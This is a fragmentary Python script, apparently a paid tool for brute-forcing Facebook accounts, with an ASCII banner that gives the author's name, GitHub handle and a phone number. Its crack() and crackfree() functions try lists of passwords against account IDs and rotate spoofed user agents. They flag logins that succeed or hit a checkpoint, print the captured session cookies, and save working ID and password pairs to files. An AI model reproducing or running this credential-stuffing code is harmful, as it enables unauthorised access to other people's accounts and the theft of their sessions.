...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/profile.php?id=100000901458099')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
$$ |  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |\$$$ |
$$ |  $$ |$$$$$$$$\ $$ |  $$ | $$$$$$  |$$ | \$$ |
\__|  \__|\________|\__|  \__| \______/ \__|  \__|
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mHeron Chowdhury ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Heron Chowdhury ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mRiyad22750 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01628777568 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
╠══[VERSION                  • 2.7 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
print(logo)
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/Heron.King.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Heron•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Heron-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Heron-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Heron,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Heron-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/600.3.27 (KHTML, like Gecko) Version/11.0 Mobile/C9VDBQ Safari/628.13',
            'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Heron-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Heron-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Heron,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
